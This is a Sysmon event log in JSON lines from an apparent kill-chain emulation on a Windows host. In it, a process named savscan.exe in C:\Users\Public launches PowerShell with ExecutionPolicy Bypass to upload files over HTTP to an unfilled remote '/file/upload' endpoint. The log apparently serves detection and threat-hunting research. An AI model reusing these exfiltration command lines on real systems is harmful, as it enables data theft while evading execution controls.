{"System": {"Provider": {"@Name": "Microsoft-Windows-Sysmon", "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"}, "EventID": {"@Qualifiers": "", "$": 11}, "Version": 2, "Level": 4, "Task": 11, "Opcode": 0, "Keywords": "0x8000000000000000", "TimeCreated": {"@SystemTime": "2020-08-13 14:47:09.486246"}, "EventRecordID": 19220, "Correlation": {"@ActivityID": "", "@RelatedActivityID": ""}, "Execution": {"@ProcessID": 8748, "@ThreadID": 5336}, "Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "Qishna", "Security": {"@UserID": "S-1-5-18"}}, "EventData": {"RuleName": "FileCreate include Group", "UtcTime": "2020-08-13 14:47:09.455", "ProcessGuid": "{4e85e66a-526d-5f35-3146-000000004300}", "ProcessId": 11420, "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "TargetFilename": "C:\\Users\\garip\\AppData\\Local\\Temp\\__PSScriptPolicyTest_z5otiu2m.ze1.psm1", "CreationUtcTime": "2020-08-13 14:47:09.455"}, "fields": {"time": 1597304829.0, "host": "Qishna", "source": "killchain_logs.evtx"}}
{"System": {"Provider": {"@Name": "Microsoft-Windows-Sysmon", "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"}, "EventID": {"@Qualifiers": "", "$": 17}, "Version": 1, "Level": 4, "Task": 17, "Opcode": 0, "Keywords": "0x8000000000000000", "TimeCreated": {"@SystemTime": "2020-08-13 14:47:09.539574"}, "EventRecordID": 19221, "Correlation": {"@ActivityID": "", "@RelatedActivityID": ""}, "Execution": {"@ProcessID": 8748, "@ThreadID": 5336}, "Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "Qishna", "Security": {"@UserID": "S-1-5-18"}}, "EventData": {"RuleName": "PipeEvent include Group", "EventType": "CreatePipe", "UtcTime": "2020-08-13 14:47:09.521", "ProcessGuid": "{4e85e66a-526d-5f35-3146-000000004300}", "ProcessId": 11420, "PipeName": "\\PSHost.132418036293487884.11420.DefaultAppDomain.powershell", "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"}, "fields": {"time": 1597304829.0, "host": "Qishna", "source": "killchain_logs.evtx"}}
{"System": {"Provider": {"@Name": "Microsoft-Windows-Sysmon", "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"}, "EventID": {"@Qualifiers": "", "$": 11}, "Version": 2, "Level": 4, "Task": 11, "Opcode": 0, "Keywords": "0x8000000000000000", "TimeCreated": {"@SystemTime": "2020-08-13 14:47:09.964426"}, "EventRecordID": 19222, "Correlation": {"@ActivityID": "", "@RelatedActivityID": ""}, "Execution": {"@ProcessID": 8748, "@ThreadID": 5336}, "Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "Qishna", "Security": {"@UserID": "S-1-5-18"}}, "EventData": {"RuleName": "FileCreate include Group", "UtcTime": "2020-08-13 14:47:09.963", "ProcessGuid": "{4e85e66a-526d-5f35-3146-000000004300}", "ProcessId": 11420, "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "TargetFilename": "C:\\Users\\garip\\AppData\\Local\\Microsoft\\Windows\\PowerShell\\StartupProfileData-NonInteractive", "CreationUtcTime": "2019-08-09 14:16:02.521"}, "fields": {"time": 1597304829.0, "host": "Qishna", "source": "killchain_logs.evtx"}}
{"System": {"Provider": {"@Name": "Microsoft-Windows-Sysmon", "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"}, "EventID": {"@Qualifiers": "", "$": 1}, "Version": 5, "Level": 4, "Task": 1, "Opcode": 0, "Keywords": "0x8000000000000000", "TimeCreated": {"@SystemTime": "2020-08-13 14:47:13.360100"}, "EventRecordID": 19223, "Correlation": {"@ActivityID": "", "@RelatedActivityID": ""}, "Execution": {"@ProcessID": 8748, "@ThreadID": 5336}, "Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "Qishna", "Security": {"@UserID": "S-1-5-18"}}, "EventData": {"RuleName": "ProcessCreate include Group", "UtcTime": "2020-08-13 14:47:13.352", "ProcessGuid": "{4e85e66a-5271-5f35-3246-000000004300}", "ProcessId": 18808, "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "FileVersion": "10.0.18362.1 (WinBuild.160101.0800)", "Description": "Windows PowerShell", "Product": "Microsoft\u00ae Windows\u00ae Operating System", "Company": "Microsoft Corporation", "OriginalFileName": "PowerShell.EXE", "CommandLine": "powershell.exe -ExecutionPolicy Bypass -C \"$ErrorActionPreference = 'Stop';$fieldName = 'pathToSignedReportingExe=`%%ProgramFiles`%%\\Windows` Defender\\MsMpeng.exe';$filePath = 'pathToSignedReportingExe=`%%ProgramFiles`%%\\Windows` Defender\\MsMpeng.exe';$url = \\\"://None:None/file/upload\\\";Add-Type -AssemblyName 'System.Net.Http';$client = New-Object System.Net.Http.HttpClient;$content = New-Object System.Net.Http.MultipartFormDataContent;$fileStream = [System.IO.File]::OpenRead($filePath);$fileName = [System.IO.Path]::GetFileName($filePath);$fileContent = New-Object System.Net.Http.StreamContent($fileStream);$content.Add($fileContent, $fieldName, $fileName);$client.DefaultRequestHeaders.Add(\\\"X-Request-Id\\\", $env:COMPUTERNAME + '-ajpfgl');$client.DefaultRequestHeaders.Add(\\\"User-Agent\\\",\\\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36\\\");$result = $client.PostAsync($url, $content).Result;$result.EnsureSuccessStatusCode();\"", "CurrentDirectory": "C:\\Windows\\system32\\", "User": "QISHNA\\garip", "LogonGuid": "{4e85e66a-1016-5f31-8b72-060000000000}", "LogonId": "0x000000000006728b", "TerminalSessionId": 1, "IntegrityLevel": "High", "Hashes": "MD5=CDA48FC75952AD12D99E526D0B6BF70A,SHA256=908B64B1971A979C7E3E8CE4621945CBA84854CB98D76367B791A6E22B5F6D53,IMPHASH=A7CEFACDDA74B13CD330390769752481", "ParentProcessGuid": "{4e85e66a-05a8-5f35-0242-000000004300}", "ParentProcessId": 11772, "ParentImage": "C:\\Users\\Public\\savscan.exe", "ParentCommandLine": "\"C:\\Users\\Public\\savscan.exe\" -socket 0.0.0.0:7010 -http http://127.0.0.1:8888 -contact tcp "}, "fields": {"time": 1597304833.0, "host": "Qishna", "source": "killchain_logs.evtx"}}
{"System": {"Provider": {"@Name": "Microsoft-Windows-Sysmon", "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"}, "EventID": {"@Qualifiers": "", "$": 11}, "Version": 2, "Level": 4, "Task": 11, "Opcode": 0, "Keywords": "0x8000000000000000", "TimeCreated": {"@SystemTime": "2020-08-13 14:47:13.473475"}, "EventRecordID": 19224, "Correlation": {"@ActivityID": "", "@RelatedActivityID": ""}, "Execution": {"@ProcessID": 8748, "@ThreadID": 5336}, "Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "Qishna", "Security": {"@UserID": "S-1-5-18"}}, "EventData": {"RuleName": "FileCreate include Group", "UtcTime": "2020-08-13 14:47:13.454", "ProcessGuid": "{4e85e66a-5271-5f35-3246-000000004300}", "ProcessId": 18808, "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "TargetFilename": "C:\\Users\\garip\\AppData\\Local\\Temp\\__PSScriptPolicyTest_5bizwr5w.a2n.ps1", "CreationUtcTime": "2020-08-13 14:47:13.454"}, "fields": {"time": 1597304833.0, "host": "Qishna", "source": "killchain_logs.evtx"}}
{"System": {"Provider": {"@Name": "Microsoft-Windows-Sysmon", "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"}, "EventID": {"@Qualifiers": "", "$": 11}, "Version": 2, "Level": 4, "Task": 11, "Opcode": 0, "Keywords": "0x8000000000000000", "TimeCreated": {"@SystemTime": "2020-08-13 14:47:13.490925"}, "EventRecordID": 19225, "Correlation": {"@ActivityID": "", "@RelatedActivityID": ""}, "Execution": {"@ProcessID": 8748, "@ThreadID": 5336}, "Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "Qishna", "Security": {"@UserID": "S-1-5-18"}}, "EventData": {"RuleName": "FileCreate include Group", "UtcTime": "2020-08-13 14:47:13.461", "ProcessGuid": "{4e85e66a-5271-5f35-3246-000000004300}", "ProcessId": 18808, "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "TargetFilename": "C:\\Users\\garip\\AppData\\Local\\Temp\\__PSScriptPolicyTest_uzubw3em.0gr.psm1", "CreationUtcTime": "2020-08-13 14:47:13.460"}, "fields": {"time": 1597304833.0, "host": "Qishna", "source": "killchain_logs.evtx"}}
{"System": {"Provider": {"@Name": "Microsoft-Windows-Sysmon", "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"}, "EventID": {"@Qualifiers": "", "$": 17}, "Version": 1, "Level": 4, "Task": 17, "Opcode": 0, "Keywords": "0x8000000000000000", "TimeCreated": {"@SystemTime": "2020-08-13 14:47:13.551016"}, "EventRecordID": 19226, "Correlation": {"@ActivityID": "", "@RelatedActivityID": ""}, "Execution": {"@ProcessID": 8748, "@ThreadID": 5336}, "Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "Qishna", "Security": {"@UserID": "S-1-5-18"}}, "EventData": {"RuleName": "PipeEvent include Group", "EventType": "CreatePipe", "UtcTime": "2020-08-13 14:47:13.526", "ProcessGuid": "{4e85e66a-5271-5f35-3246-000000004300}", "ProcessId": 18808, "PipeName": "\\PSHost.132418036333525076.18808.DefaultAppDomain.powershell", "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"}, "fields": {"time": 1597304833.0, "host": "Qishna", "source": "killchain_logs.evtx"}}
{"System": {"Provider": {"@Name": "Microsoft-Windows-Sysmon", "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"}, "EventID": {"@Qualifiers": "", "$": 11}, "Version": 2, "Level": 4, "Task": 11, "Opcode": 0, "Keywords": "0x8000000000000000", "TimeCreated": {"@SystemTime": "2020-08-13 14:47:13.991819"}, "EventRecordID": 19227, "Correlation": {"@ActivityID": "", "@RelatedActivityID": ""}, "Execution": {"@ProcessID": 8748, "@ThreadID": 5336}, "Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "Qishna", "Security": {"@UserID": "S-1-5-18"}}, "EventData": {"RuleName": "FileCreate include Group", "UtcTime": "2020-08-13 14:47:13.991", "ProcessGuid": "{4e85e66a-5271-5f35-3246-000000004300}", "ProcessId": 18808, "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "TargetFilename": "C:\\Users\\garip\\AppData\\Local\\Microsoft\\Windows\\PowerShell\\StartupProfileData-NonInteractive", "CreationUtcTime": "2019-08-09 14:16:02.521"}, "fields": {"time": 1597304833.0, "host": "Qishna", "source": "killchain_logs.evtx"}}
{"System": {"Provider": {"@Name": "Microsoft-Windows-Sysmon", "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"}, "EventID": {"@Qualifiers": "", "$": 3}, "Version": 5, "Level": 4, "Task": 3, "Opcode": 0, "Keywords": "0x8000000000000000", "TimeCreated": {"@SystemTime": "2020-08-13 14:47:16.378553"}, "EventRecordID": 19228, "Correlation": {"@ActivityID": "", "@RelatedActivityID": ""}, "Execution": {"@ProcessID": 8748, "@ThreadID": 16764}, "Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "Qishna", "Security": {"@UserID": "S-1-5-18"}}, "EventData": {"RuleName": "NetworkConnect include Group", "UtcTime": "2020-08-13 14:47:19.546", "ProcessGuid": "{4e85e66a-100f-5f31-6000-000000004300}", "ProcessId": 3708, "Image": "C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.2007.8-0\\MsMpEng.exe", "User": "NT AUTHORITY\\\u0421\u0418\u0421\u0422\u0415\u041c\u0410", "Protocol": "tcp", "Initiated": true, "SourceIsIpv6": false, "SourceIp": "192.168.0.107", "SourceHostname": "host.docker.internal", "SourcePort": 58354, "SourcePortName": "-", "DestinationIsIpv6": false, "DestinationIp": "40.115.119.185", "DestinationHostname": "-", "DestinationPort": 443, "DestinationPortName": "https"}, "fields": {"time": 1597304836.0, "host": "Qishna", "source": "killchain_logs.evtx"}}
{"System": {"Provider": {"@Name": "Microsoft-Windows-Sysmon", "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"}, "EventID": {"@Qualifiers": "", "$": 1}, "Version": 5, "Level": 4, "Task": 1, "Opcode": 0, "Keywords": "0x8000000000000000", "TimeCreated": {"@SystemTime": "2020-08-13 14:47:17.363682"}, "EventRecordID": 19229, "Correlation": {"@ActivityID": "", "@RelatedActivityID": ""}, "Execution": {"@ProcessID": 8748, "@ThreadID": 5336}, "Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "Qishna", "Security": {"@UserID": "S-1-5-18"}}, "EventData": {"RuleName": "ProcessCreate include Group", "UtcTime": "2020-08-13 14:47:17.356", "ProcessGuid": "{4e85e66a-5275-5f35-3346-000000004300}", "ProcessId": 14404, "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "FileVersion": "10.0.18362.1 (WinBuild.160101.0800)", "Description": "Windows PowerShell", "Product": "Microsoft\u00ae Windows\u00ae Operating System", "Company": "Microsoft Corporation", "OriginalFileName": "PowerShell.EXE", "CommandLine": "powershell.exe -ExecutionPolicy Bypass -C \"$ErrorActionPreference = 'Stop';$fieldName = 'productState=397568';$filePath = 'productState=397568';$url = \\\"://None:None/file/upload\\\";Add-Type -AssemblyName 'System.Net.Http';$client = New-Object System.Net.Http.HttpClient;$content = New-Object System.Net.Http.MultipartFormDataContent;$fileStream = [System.IO.File]::OpenRead($filePath);$fileName = [System.IO.Path]::GetFileName($filePath);$fileContent = New-Object System.Net.Http.StreamContent($fileStream);$content.Add($fileContent, $fieldName, $fileName);$client.DefaultRequestHeaders.Add(\\\"X-Request-Id\\\", $env:COMPUTERNAME + '-ajpfgl');$client.DefaultRequestHeaders.Add(\\\"User-Agent\\\",\\\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36\\\");$result = $client.PostAsync($url, $content).Result;$result.EnsureSuccessStatusCode();\"", "CurrentDirectory": "C:\\Windows\\system32\\", "User": "QISHNA\\garip", "LogonGuid": "{4e85e66a-1016-5f31-8b72-060000000000}", "LogonId": "0x000000000006728b", "TerminalSessionId": 1, "IntegrityLevel": "High", "Hashes": "MD5=CDA48FC75952AD12D99E526D0B6BF70A,SHA256=908B64B1971A979C7E3E8CE4621945CBA84854CB98D76367B791A6E22B5F6D53,IMPHASH=A7CEFACDDA74B13CD330390769752481", "ParentProcessGuid": "{4e85e66a-05a8-5f35-0242-000000004300}", "ParentProcessId": 11772, "ParentImage": "C:\\Users\\Public\\savscan.exe", "ParentCommandLine": "\"C:\\Users\\Public\\savscan.exe\" -socket 0.0.0.0:7010 -http http://127.0.0.1:8888 -contact tcp "}, "fields": {"time": 1597304837.0, "host": "Qishna", "source": "killchain_logs.evtx"}}
{"System": {"Provider": {"@Name": "Microsoft-Windows-Sysmon", "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"}, "EventID": {"@Qualifiers": "", "$": 11}, "Version": 2, "Level": 4, "Task": 11, "Opcode": 0, "Keywords": "0x8000000000000000", "TimeCreated": {"@SystemTime": "2020-08-13 14:47:17.462679"}, "EventRecordID": 19230, "Correlation": {"@ActivityID": "", "@RelatedActivityID": ""}, "Execution": {"@ProcessID": 8748, "@ThreadID": 5336}, "Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "Qishna", "Security": {"@UserID": "S-1-5-18"}}, "EventData": {"RuleName": "FileCreate include Group", "UtcTime": "2020-08-13 14:47:17.456", "ProcessGuid": "{4e85e66a-5275-5f35-3346-000000004300}", "ProcessId": 14404, "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "TargetFilename": "C:\\Users\\garip\\AppData\\Local\\Temp\\__PSScriptPolicyTest_x02lyjv3.tsv.ps1", "CreationUtcTime": "2020-08-13 14:47:17.456"}, "fields": {"time": 1597304837.0, "host": "Qishna", "source": "killchain_logs.evtx"}}
{"System": {"Provider": {"@Name": "Microsoft-Windows-Sysmon", "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"}, "EventID": {"@Qualifiers": "", "$": 11}, "Version": 2, "Level": 4, "Task": 11, "Opcode": 0, "Keywords": "0x8000000000000000", "TimeCreated": {"@SystemTime": "2020-08-13 14:47:17.490210"}, "EventRecordID": 19231, "Correlation": {"@ActivityID": "", "@RelatedActivityID": ""}, "Execution": {"@ProcessID": 8748, "@ThreadID": 5336}, "Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "Qishna", "Security": {"@UserID": "S-1-5-18"}}, "EventData": {"RuleName": "FileCreate include Group", "UtcTime": "2020-08-13 14:47:17.463", "ProcessGuid": "{4e85e66a-5275-5f35-3346-000000004300}", "ProcessId": 14404, "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "TargetFilename": "C:\\Users\\garip\\AppData\\Local\\Temp\\__PSScriptPolicyTest_xoutbdvd.tmu.psm1", "CreationUtcTime": "2020-08-13 14:47:17.463"}, "fields": {"time": 1597304837.0, "host": "Qishna", "source": "killchain_logs.evtx"}}
{"System": {"Provider": {"@Name": "Microsoft-Windows-Sysmon", "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"}, "EventID": {"@Qualifiers": "", "$": 17}, "Version": 1, "Level": 4, "Task": 17, "Opcode": 0, "Keywords": "0x8000000000000000", "TimeCreated": {"@SystemTime": "2020-08-13 14:47:17.552101"}, "EventRecordID": 19232, "Correlation": {"@ActivityID": "", "@RelatedActivityID": ""}, "Execution": {"@ProcessID": 8748, "@ThreadID": 5336}, "Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "Qishna", "Security": {"@UserID": "S-1-5-18"}}, "EventData": {"RuleName": "PipeEvent include Group", "EventType": "CreatePipe", "UtcTime": "2020-08-13 14:47:17.528", "ProcessGuid": "{4e85e66a-5275-5f35-3346-000000004300}", "ProcessId": 14404, "PipeName": "\\PSHost.132418036373565698.14404.DefaultAppDomain.powershell", "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"}, "fields": {"time": 1597304837.0, "host": "Qishna", "source": "killchain_logs.evtx"}}
{"System": {"Provider": {"@Name": "Microsoft-Windows-Sysmon", "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"}, "EventID": {"@Qualifiers": "", "$": 11}, "Version": 2, "Level": 4, "Task": 11, "Opcode": 0, "Keywords": "0x8000000000000000", "TimeCreated": {"@SystemTime": "2020-08-13 14:47:17.969534"}, "EventRecordID": 19233, "Correlation": {"@ActivityID": "", "@RelatedActivityID": ""}, "Execution": {"@ProcessID": 8748, "@ThreadID": 5336}, "Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "Qishna", "Security": {"@UserID": "S-1-5-18"}}, "EventData": {"RuleName": "FileCreate include Group", "UtcTime": "2020-08-13 14:47:17.968", "ProcessGuid": "{4e85e66a-5275-5f35-3346-000000004300}", "ProcessId": 14404, "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "TargetFilename": "C:\\Users\\garip\\AppData\\Local\\Microsoft\\Windows\\PowerShell\\StartupProfileData-NonInteractive", "CreationUtcTime": "2019-08-09 14:16:02.521"}, "fields": {"time": 1597304837.0, "host": "Qishna", "source": "killchain_logs.evtx"}}
{"System": {"Provider": {"@Name": "Microsoft-Windows-Sysmon", "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"}, "EventID": {"@Qualifiers": "", "$": 1}, "Version": 5, "Level": 4, "Task": 1, "Opcode": 0, "Keywords": "0x8000000000000000", "TimeCreated": {"@SystemTime": "2020-08-13 14:47:21.369055"}, "EventRecordID": 19234, "Correlation": {"@ActivityID": "", "@RelatedActivityID": ""}, "Execution": {"@ProcessID": 8748, "@ThreadID": 5336}, "Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "Qishna", "Security": {"@UserID": "S-1-5-18"}}, "EventData": {"RuleName": "ProcessCreate include Group", "UtcTime": "2020-08-13 14:47:21.361", "ProcessGuid": "{4e85e66a-5279-5f35-3446-000000004300}", "ProcessId": 13888, "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "FileVersion": "10.0.18362.1 (WinBuild.160101.0800)", "Description": "Windows PowerShell", "Product": "Microsoft\u00ae Windows\u00ae Operating System", "Company": "Microsoft Corporation", "OriginalFileName": "PowerShell.EXE", "CommandLine": "powershell.exe -ExecutionPolicy Bypass -C \"$ErrorActionPreference = 'Stop';$fieldName = 'timestamp=Mon,` 10` Aug` 2020` 09:17:05` GMT';$filePath = 'timestamp=Mon,` 10` Aug` 2020` 09:17:05` GMT';$url = \\\"://None:None/file/upload\\\";Add-Type -AssemblyName 'System.Net.Http';$client = New-Object System.Net.Http.HttpClient;$content = New-Object System.Net.Http.MultipartFormDataContent;$fileStream = [System.IO.File]::OpenRead($filePath);$fileName = [System.IO.Path]::GetFileName($filePath);$fileContent = New-Object System.Net.Http.StreamContent($fileStream);$content.Add($fileContent, $fieldName, $fileName);$client.DefaultRequestHeaders.Add(\\\"X-Request-Id\\\", $env:COMPUTERNAME + '-ajpfgl');$client.DefaultRequestHeaders.Add(\\\"User-Agent\\\",\\\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36\\\");$result = $client.PostAsync($url, $content).Result;$result.EnsureSuccessStatusCode();\"", "CurrentDirectory": "C:\\Windows\\system32\\", "User": "QISHNA\\garip", "LogonGuid": "{4e85e66a-1016-5f31-8b72-060000000000}", "LogonId": "0x000000000006728b", "TerminalSessionId": 1, "IntegrityLevel": "High", "Hashes": "MD5=CDA48FC75952AD12D99E526D0B6BF70A,SHA256=908B64B1971A979C7E3E8CE4621945CBA84854CB98D76367B791A6E22B5F6D53,IMPHASH=A7CEFACDDA74B13CD330390769752481", "ParentProcessGuid": "{4e85e66a-05a8-5f35-0242-000000004300}", "ParentProcessId": 11772, "ParentImage": "C:\\Users\\Public\\savscan.exe", "ParentCommandLine": "\"C:\\Users\\Public\\savscan.exe\" -socket 0.0.0.0:7010 -http http://127.0.0.1:8888 -contact tcp "}, "fields": {"time": 1597304841.0, "host": "Qishna", "source": "killchain_logs.evtx"}}
{"System": {"Provider": {"@Name": "Microsoft-Windows-Sysmon", "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"}, "EventID": {"@Qualifiers": "", "$": 11}, "Version": 2, "Level": 4, "Task": 11, "Opcode": 0, "Keywords": "0x8000000000000000", "TimeCreated": {"@SystemTime": "2020-08-13 14:47:21.467642"}, "EventRecordID": 19235, "Correlation": {"@ActivityID": "", "@RelatedActivityID": ""}, "Execution": {"@ProcessID": 8748, "@ThreadID": 5336}, "Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "Qishna", "Security": {"@UserID": "S-1-5-18"}}, "EventData": {"RuleName": "FileCreate include Group", "UtcTime": "2020-08-13 14:47:21.461", "ProcessGuid": "{4e85e66a-5279-5f35-3446-000000004300}", "ProcessId": 13888, "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "TargetFilename": "C:\\Users\\garip\\AppData\\Local\\Temp\\__PSScriptPolicyTest_43ir5i1o.gvr.ps1", "CreationUtcTime": "2020-08-13 14:47:21.461"}, "fields": {"time": 1597304841.0, "host": "Qishna", "source": "killchain_logs.evtx"}}
{"System": {"Provider": {"@Name": "Microsoft-Windows-Sysmon", "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"}, "EventID": {"@Qualifiers": "", "$": 11}, "Version": 2, "Level": 4, "Task": 11, "Opcode": 0, "Keywords": "0x8000000000000000", "TimeCreated": {"@SystemTime": "2020-08-13 14:47:21.485792"}, "EventRecordID": 19236, "Correlation": {"@ActivityID": "", "@RelatedActivityID": ""}, "Execution": {"@ProcessID": 8748, "@ThreadID": 5336}, "Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "Qishna", "Security": {"@UserID": "S-1-5-18"}}, "EventData": {"RuleName": "FileCreate include Group", "UtcTime": "2020-08-13 14:47:21.465", "ProcessGuid": "{4e85e66a-5279-5f35-3446-000000004300}", "ProcessId": 13888, "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "TargetFilename": "C:\\Users\\garip\\AppData\\Local\\Temp\\__PSScriptPolicyTest_fganmo0z.zcr.psm1", "CreationUtcTime": "2020-08-13 14:47:21.465"}, "fields": {"time": 1597304841.0, "host": "Qishna", "source": "killchain_logs.evtx"}}
{"System": {"Provider": {"@Name": "Microsoft-Windows-Sysmon", "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"}, "EventID": {"@Qualifiers": "", "$": 17}, "Version": 1, "Level": 4, "Task": 17, "Opcode": 0, "Keywords": "0x8000000000000000", "TimeCreated": {"@SystemTime": "2020-08-13 14:47:21.558399"}, "EventRecordID": 19237, "Correlation": {"@ActivityID": "", "@RelatedActivityID": ""}, "Execution": {"@ProcessID": 8748, "@ThreadID": 5336}, "Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "Qishna", "Security": {"@UserID": "S-1-5-18"}}, "EventData": {"RuleName": "PipeEvent include Group", "EventType": "CreatePipe", "UtcTime": "2020-08-13 14:47:21.542", "ProcessGuid": "{4e85e66a-5279-5f35-3446-000000004300}", "ProcessId": 13888, "PipeName": "\\PSHost.132418036413613998.13888.DefaultAppDomain.powershell", "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"}, "fields": {"time": 1597304841.0, "host": "Qishna", "source": "killchain_logs.evtx"}}
{"System": {"Provider": {"@Name": "Microsoft-Windows-Sysmon", "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"}, "EventID": {"@Qualifiers": "", "$": 11}, "Version": 2, "Level": 4, "Task": 11, "Opcode": 0, "Keywords": "0x8000000000000000", "TimeCreated": {"@SystemTime": "2020-08-13 14:47:21.989494"}, "EventRecordID": 19238, "Correlation": {"@ActivityID": "", "@RelatedActivityID": ""}, "Execution": {"@ProcessID": 8748, "@ThreadID": 5336}, "Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "Qishna", "Security": {"@UserID": "S-1-5-18"}}, "EventData": {"RuleName": "FileCreate include Group", "UtcTime": "2020-08-13 14:47:21.988", "ProcessGuid": "{4e85e66a-5279-5f35-3446-000000004300}", "ProcessId": 13888, "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "TargetFilename": "C:\\Users\\garip\\AppData\\Local\\Microsoft\\Windows\\PowerShell\\StartupProfileData-NonInteractive", "CreationUtcTime": "2019-08-09 14:16:02.521"}, "fields": {"time": 1597304841.0, "host": "Qishna", "source": "killchain_logs.evtx"}}
